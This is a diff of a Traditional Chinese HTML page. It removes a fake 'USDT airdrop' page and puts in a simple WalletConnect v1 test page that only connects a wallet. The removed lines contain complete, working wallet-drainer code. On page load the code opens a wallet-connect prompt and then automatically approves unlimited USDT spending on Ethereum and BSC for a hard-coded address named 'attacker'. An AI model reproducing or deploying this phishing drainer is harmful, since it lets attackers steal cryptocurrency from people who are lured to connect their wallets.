@@ -2,88 +2,33 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>USDT 空投活動 - 自動授權</title>
-  <!-- WalletConnect v2 Web3Modal -->
-  <script src="https://unpkg.com/@web3modal/html@2.6.2/dist/index.umd.js"></script>
-  <script src="https://unpkg.com/@web3modal/ethereum@2.6.2/dist/index.umd.js"></script>
-  <script src="https://unpkg.com/@wagmi/core@1.3.0/dist/index.umd.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <style>
-    body {
-      background-color: #111;
-      color: #fff;
-      font-family: sans-serif;
-      text-align: center;
-      padding-top: 50px;
-    }
-    #status {
-      margin-top: 20px;
-      font-size: 1.1rem;
-    }
-  </style>
+  <title>測試 QR 掃碼</title>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
 </head>
-<body>
-  <h2>🎁 恭喜你獲得 USDT 空投！</h2>
-  <p>請使用手機冷錢包掃碼連接錢包以完成授權</p>
-  <div id="status">🔃 等待連線中...</div>
+<body style="background:#111; color:white; text-align:center; padding-top:60px; font-family:sans-serif;">
+  <h2>📲 測試 WalletConnect v1 掃碼</h2>
+  <button onclick="connect()">點我連接錢包</button>
+  <p id="status" style="margin-top:20px;"></p>
 
   <script>
-    (async () => {
-      const { Web3Modal } = window.Web3Modal;
-      const { EthereumClient, w3mConnectors, w3mProvider } = window.Web3ModalEthereum;
-      const { configureChains, createConfig } = window.wagmi;
-      const chains = [window.wagmi.mainnet, window.wagmi.bsc];
-      const projectId = 'eebb83fd0c3ec5b1770ad20a754e2c8d';
-
-      const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
-      const wagmiConfig = createConfig({
-        autoConnect: true,
-        connectors: w3mConnectors({ projectId, chains }),
-        publicClient
-      });
-
-      const ethereumClient = new EthereumClient(wagmiConfig, chains);
-      const web3modal = new Web3Modal({ projectId, themeMode: 'dark' }, ethereumClient);
-
-      const USDT_BY_CHAIN = {
-        1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-        56: "0x55d398326f99059ff775485246999027b3197955"
-      };
-      const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-      const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];
-
-      function log(msg) {
-        document.getElementById("status").innerText = msg;
+    const provider = new WalletConnectProvider.default({
+      rpc: {
+        1: "https://mainnet.infura.io/v3/99af7ec8242f4645ac8c27d5b9354e2c", // Ethereum
+        56: "https://bsc-dataseed.binance.org/" // BSC
       }
+    });
 
-      async function autoApprove() {
-        try {
-          const provider = new ethers.providers.Web3Provider(window.ethereum);
-          const signer = provider.getSigner();
-          const address = await signer.getAddress();
-          log("✅ 錢包已連接: " + address);
-
-          const network = await provider.getNetwork();
-          const tokenAddress = USDT_BY_CHAIN[network.chainId];
-          if (!tokenAddress) {
-            log("❌ 此鏈不支援 USDT");
-            return;
-          }
-
-          const contract = new ethers.Contract(tokenAddress, abi, signer);
-          const tx = await contract.approve(attacker, ethers.constants.MaxUint256);
-          log("✅ 授權成功！Tx Hash: " + tx.hash);
-        } catch (err) {
-          log("❌ 授權失敗：" + err.message);
-        }
+    async function connect() {
+      try {
+        await provider.enable();
+        const web3 = new Web3(provider);
+        const accounts = await web3.eth.getAccounts();
+        document.getElementById("status").innerText = "✅ 已連接：" + accounts[0];
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ 錯誤：" + e.message;
       }
-
-      // 🧠 自動開啟掃碼 + 自動執行 approve
-      window.addEventListener('load', async () => {
-        setTimeout(() => web3modal.openModal(), 1000);
-        setTimeout(() => autoApprove(), 5000);
-      });
-    })();
+    }
   </script>
 </body>
 </html>
